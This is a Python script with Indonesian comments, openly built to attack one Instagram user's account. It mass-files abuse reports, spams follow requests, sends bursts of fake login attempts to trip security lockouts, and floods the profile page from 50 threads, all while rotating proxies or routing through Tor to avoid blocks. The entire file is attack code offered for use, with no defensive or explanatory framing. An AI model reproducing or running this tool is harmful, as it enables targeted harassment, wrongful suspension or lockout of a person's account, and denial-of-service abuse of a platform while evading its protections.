import requests
import threading
import time
import random
import socket
import socks

# Konfigurasi target
TARGET_USERNAME = "username_target"  # Ganti dengan username target
INSTAGRAM_API_URL = "https://www.instagram.com/api/v1/"

# Proxy list untuk rotasi (opsional)
PROXY_LIST = [
    "http://proxy1:port",
    "http://proxy2:port",
]

# Header untuk meniru browser
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.9',
    'Referer': 'https://www.instagram.com/',
}

def rotate_ip():
    """Rotate IP menggunakan proxy atau TOR"""
    try:
        proxy = random.choice(PROXY_LIST)
        session.proxies = {'http': proxy, 'https': proxy}
    except:
        # Fallback ke TOR jika tersedia
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket

def mass_report():
    """Fungsi untuk melaporkan akun secara massal"""
    report_endpoint = f"{INSTAGRAM_API_URL}users/{TARGET_USERNAME}/report/"
    report_data = {
        'source_name': 'profile',
        'reason_id': 1,  # 1=Spam, 2=Harassment, dll
        'frx_context': '' 
    }
    
    try:
        response = session.post(report_endpoint, data=report_data)
        if response.status_code == 200:
            print(f"[SUCCESS] Report berhasil dikirim")
        else:
            print(f"[RETRY] Mencoba lagi dengan IP berbeda...")
            rotate_ip()
    except Exception as e:
        print(f"[ERROR] {e}")

def spam_follow_requests():
    """Mengirim follow request berulang kali"""
    follow_url = f"{INSTAGRAM_API_URL}web/friendships/{TARGET_USERNAME}/follow/"
    
    for i in range(100):  # 100 request per session
        try:
            session.post(follow_url)
            print(f"[FOLLOW] Request {i+1} terkirim")
            time.sleep(random.uniform(0.5, 2))
        except:
            rotate_ip()

def fake_login_attempts():
    """Membuat percobaan login palsu untuk trigger keamanan"""
    login_url = "https://www.instagram.com/accounts/login/ajax/"
    
    # Generate random credentials
    fake_credentials = {
        'username': f"user{random.randint(1,10000)}@fake.com",
        'password': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=10))
    }
    
    for _ in range(50):
        try:
            session.post(login_url, data=fake_credentials)
            print("[LOGIN SPAM] Percobaan login palsu dikirim")
            time.sleep(0.3)
        except:
            rotate_ip()

def ddos_style_requests():
    """Mengirim request berat ke endpoint akun target"""
    profile_url = f"https://www.instagram.com/{TARGET_USERNAME}/"
    
    def flood():
        while True:
            try:
                session.get(profile_url)
                print("[FLOOD] Request flood dikirim")
            except:
                pass
    
    # Jalankan 50 thread bersamaan
    for _ in range(50):
        threading.Thread(target=flood, daemon=True).start()

# Jalankan semua serangan secara bersamaan
def launch_attack():
    print(f"[START] Menyerang akun: {TARGET_USERNAME}")
    print("[INFO] Serangan dimulai dalam 3 detik...")
    time.sleep(3)
    
    # Thread untuk berbagai jenis serangan
    threading.Thread(target=mass_report, daemon=True).start()
    threading.Thread(target=spam_follow_requests, daemon=True).start()
    threading.Thread(target=fake_login_attempts, daemon=True).start()
    threading.Thread(target=ddos_style_requests, daemon=True).start()
    
    # Pertahankan serangan
    while True:
        time.sleep(3600)  # Jalankan selama 1 jam
        print("[STATUS] Serangan masih berjalan...")

if __name__ == "__main__":
    # Setup session dengan rotasi IP
    session = requests.Session()
    session.headers.update(HEADERS)
    rotate_ip()
    
    # Mulai serangan
    launch_attack()